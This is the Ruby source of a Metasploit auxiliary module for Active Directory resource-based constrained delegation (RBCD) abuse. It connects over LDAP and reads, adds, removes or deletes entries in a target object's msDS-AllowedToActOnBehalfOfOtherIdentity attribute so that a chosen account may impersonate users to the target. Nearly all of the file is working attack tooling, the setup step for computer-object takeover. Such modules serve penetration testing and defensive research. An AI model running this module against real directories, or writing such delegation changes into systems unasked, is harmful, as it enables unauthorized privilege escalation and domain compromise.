##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP

  ATTRIBUTE = 'msDS-AllowedToActOnBehalfOfOtherIdentity'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Role Base Constrained Delegation',
        'Description' => %q{
        },
        'Author' => [
          'Podalirius', # Remi Gascou (@podalirius_), Impacket reference implementation
          'Charlie Bromberg', # Charlie Bromberg (@_nwodtuhs), Impacket reference implementation
          'Spencer McIntyre' # module author
        ],
        'References' => [
          ['URL', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution'],
          ['URL', 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd'],
          ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/3c6713e309cae871d685fa443d3e21b7026a2155/examples/rbcd.py']
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          ['READ', { 'Description' => 'Read the security descriptor' }],
          ['REMOVE', { 'Description' => 'Remove matching ACEs from the security descriptor DACL' }],
          ['FLUSH', { 'Description' => 'Delete the security descriptor' }],
          ['WRITE', { 'Description' => 'Add an ACE to the security descriptor DACL' }]
        ],
        'DefaultAction' => 'READ',
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [CONFIG_CHANGES], # REMOVE, FLUSH, WRITE all make changes
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('DELEGATE_TO', [ true, 'The delegation target' ]),
      OptString.new('DELEGATE_FROM', [ false, 'The delegation source' ])
    ])
  end

  def build_ace(sid)
    Rex::Proto::MsDtyp::MsDtypAccessAllowedAce.new({
      body: {
        access_mask: Rex::Proto::MsDtyp::MsDtypAccessMask::ALL,
        sid: sid
      }
    })
  end

  def get_delegate_from_obj
    delegate_from = datastore['DELEGATE_FROM']
    if delegate_from.blank?
      fail_with(Failure::BadConfig, 'The DELEGATE_FROM option must be specified for this action.')
    end

    delegate_from = ldap_get("(sAMAccountName=#{datastore['DELEGATE_FROM']})", attributes: ['sAMAccountName', 'ObjectSID'])
    fail_with(Failure::NotFound, "Failed to find: #{datastore['DELEGATE_FROM']}") unless delegate_from

    delegate_from
  end

  def ldap_get(filter, attributes: [])
    raw_obj = @ldap.search(base: @base_dn, filter: filter, attributes: attributes).first
    return nil unless raw_obj

    obj = {}

    obj['dn'] = raw_obj['dn'].first.to_s
    unless raw_obj['sAMAccountName'].empty?
      obj['sAMAccountName'] = raw_obj['sAMAccountName'].first.to_s
    end

    unless raw_obj['ObjectSid'].empty?
      obj['ObjectSid'] = Rex::Proto::MsDtyp::MsDtypSid.read(raw_obj['ObjectSid'].first)
    end

    unless raw_obj['msDS-AllowedToActOnBehalfOfOtherIdentity'].empty?
      obj['msDS-AllowedToActOnBehalfOfOtherIdentity'] = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(raw_obj['msDS-AllowedToActOnBehalfOfOtherIdentity'].first)
    end

    obj
  end

  def run
    ldap_connect do |ldap|
      bind_result = ldap.as_json['result']['ldap_result']

      # Codes taken from https://ldap.com/ldap-result-code-reference-core-ldapv3-result-codes
      case bind_result['resultCode']
      when 0
        print_good('Successfully bound to the LDAP server!')
      when 1
        fail_with(Failure::NoAccess, "An operational error occurred, perhaps due to lack of authorization. The error was: #{bind_result['errorMessage']}")
      when 7
        fail_with(Failure::NoTarget, 'Target does not support the simple authentication mechanism!')
      when 8
        fail_with(Failure::NoTarget, "Server requires a stronger form of authentication than we can provide! The error was: #{bind_result['errorMessage']}")
      when 14
        fail_with(Failure::NoTarget, "Server requires additional information to complete the bind. Error was: #{bind_result['errorMessage']}")
      when 48
        fail_with(Failure::NoAccess, "Target doesn't support the requested authentication type we sent. Try binding to the same user without a password, or providing credentials if you were doing anonymous authentication.")
      when 49
        fail_with(Failure::NoAccess, 'Invalid credentials provided!')
      else
        fail_with(Failure::Unknown, "Unknown error occurred whilst binding: #{bind_result['errorMessage']}")
      end
      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = discover_base_dn(ldap))
          print_warning("Couldn't discover base DN!")
        end
      end
      @ldap = ldap

      obj = ldap_get("(sAMAccountName=#{datastore['DELEGATE_TO']})", attributes: ['sAMAccountName', 'ObjectSID', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
      fail_with(Failure::NotFound, "Failed to find: #{datastore['DELEGATE_TO']}") unless obj

      send("action_#{action.name.downcase}", obj)
    end
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
  end

  def action_read(obj)
    security_descriptor = obj[ATTRIBUTE]
    if security_descriptor.nil?
      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity field is empty.')
      return
    end

    if security_descriptor.dacl.nil?
      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity DACL field is empty.')
      return
    end

    print_status('Allowed accounts:')
    security_descriptor.dacl.aces.each do |ace|
      account_name = ldap_get("(ObjectSid=#{ace.body.sid})", attributes: ['sAMAccountName'])
      print_status("  #{account_name['sAMAccountName']} (#{ace.body.sid})")
    end
  end

  def action_remove(obj)
    delegate_from = get_delegate_from_obj

    security_descriptor = obj[ATTRIBUTE]
    unless security_descriptor.dacl && !security_descriptor.dacl.aces.empty?
      print_status('No DACL ACEs are present, no changes are necessary.')
      return
    end

    aces = security_descriptor.dacl.aces.snapshot
    aces.delete_if { |ace| ace.body[:sid] == delegate_from['ObjectSid'] }
    delta = security_descriptor.dacl.aces.length - aces.length
    if delta == 0
      print_status('No DACL ACEs matched, no changes are necessary.')
      return
    else
      print_status("Removed #{delta} matching ACE#{delta > 1 ? 's' : ''}.")
    end
    security_descriptor.dacl.aces = aces
    # clear these fields so they'll be calculated automatically after the update
    security_descriptor.dacl.acl_count.clear
    security_descriptor.dacl.acl_size.clear

    unless @ldap.replace_attribute(obj['dn'], 'msDS-AllowedToActOnBehalfOfOtherIdentity', security_descriptor.to_binary_s)
      print_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
      return
    end
    print_good('Successfully updated the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
  end

  def action_flush(obj)
    unless @ldap.delete_attribute(obj['dn'], 'msDS-AllowedToActOnBehalfOfOtherIdentity')
      print_error('Failed to deleted the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
      return
    end

    print_good('Successfully deleted the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
  end

  def action_write(obj)
    delegate_from = get_delegate_from_obj
    if obj['msDS-AllowedToActOnBehalfOfOtherIdentity']
      _action_write_update(obj, delegate_from)
    else
      _action_write_create(obj, delegate_from)
    end
  end

  def _action_write_create(obj, delegate_from)
    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.new
    security_descriptor.owner_sid = Rex::Proto::MsDtyp::MsDtypSid.new('S-1-5-32-544')
    security_descriptor.dacl = Rex::Proto::MsDtyp::MsDtypAcl.new
    security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
    security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])

    unless @ldap.add_attribute(obj['dn'], 'msDS-AllowedToActOnBehalfOfOtherIdentity', security_descriptor.to_binary_s)
      print_error('Failed to create the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
      return
    end
    print_good('Successfully created the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
  end

  def _action_write_update(obj, delegate_from)
    security_descriptor = obj[ATTRIBUTE]
    if security_descriptor.dacl
      if security_descriptor.dacl.aces.any? { |ace| ace.body[:sid].to_s == delegate_from['ObjectSid'].to_s }
        print_status("Delegation from #{datastore['DELEGATE_FROM']} to #{datastore['DELEGATE_TO']} is already enabled.")
        return true
      end
      # clear these fields so they'll be calculated automatically after the update
      security_descriptor.dacl.acl_count.clear
      security_descriptor.dacl.acl_size.clear
    else
      security_descriptor.control.dp = 1
      security_descriptor.dacl = Rex::Proto::MsDtyp::MsDtypAcl.new
      security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
    end

    security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])

    unless @ldap.replace_attribute(obj['dn'], 'msDS-AllowedToActOnBehalfOfOtherIdentity', security_descriptor.to_binary_s)
      print_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
      return
    end
    print_good('Successfully updated the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
  end
end
